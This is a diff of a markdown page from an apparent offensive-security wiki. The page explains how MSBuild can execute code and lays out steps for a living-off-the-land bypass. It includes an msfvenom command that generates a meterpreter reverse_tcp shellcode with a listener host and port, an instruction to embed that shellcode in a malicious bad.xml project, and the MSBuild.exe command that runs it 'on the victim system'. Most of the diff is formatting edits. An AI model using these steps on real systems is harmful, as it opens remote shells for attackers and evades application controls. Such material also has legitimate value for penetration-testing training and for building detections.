@@ -4,28 +4,32 @@
 
 The Microsoft Build Engine is a platform for building applications. This engine, which is also known as MSBuild, provides an XML schema for a project file that controls how the build platform processes and builds software. Visual Studio uses MSBuild, but MSBuild doesn't depend on Visual Studio. By invoking msbuild.exe or dotnet build on your project or solution file, you can orchestrate and build products in environments where Visual Studio isn't installed.
 
-We can execute code with help of MsBuild.exe by providing a .xml or .csproj file 
+We can execute code with help of MsBuild.exe by providing a .xml or .csproj file
+
 ## Practice
 
 {% tabs %}
 {% tab title="Csproj" %}
+Build and execute a C# project stored in the target csproj file.
 
-Build and execute a C# project stored in the target csproj file. 
 ```bash
 msbuild.exe project.csproj
 ```
+
 {% hint style="danger" %}
-You may want to look at [Powershell without Powershell.exe](./whithout-powershell.md) to convert ps1 scripts to .csporj file.
+You may want to look at [Powershell without Powershell.exe](whithout-powershell.md) to convert ps1 scripts to .csporj file.
 {% endhint %}
 {% endtab %}
-{% tab title="XML" %}
 
+{% tab title="XML" %}
 Generate meterpreter shellode in c#:
+
 ```bash
 v4resk@kali$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
 ```
 
 Insert shellcode into the shellcode variable in linne 46:
+
 ```bash
 #bad.xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
@@ -94,13 +98,15 @@ Insert shellcode into the shellcode variable in linne 46:
 ```
 
 Build and execute malicious payload on the victim system using MSBuild:
+
 ```bash
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
 ```
 {% endtab %}
 {% endtabs %}
 
-## References
+## Resources
 
 {% embed url="https://tryhackme.com/room/livingofftheland" %}
+
 {% embed url="https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c" %}
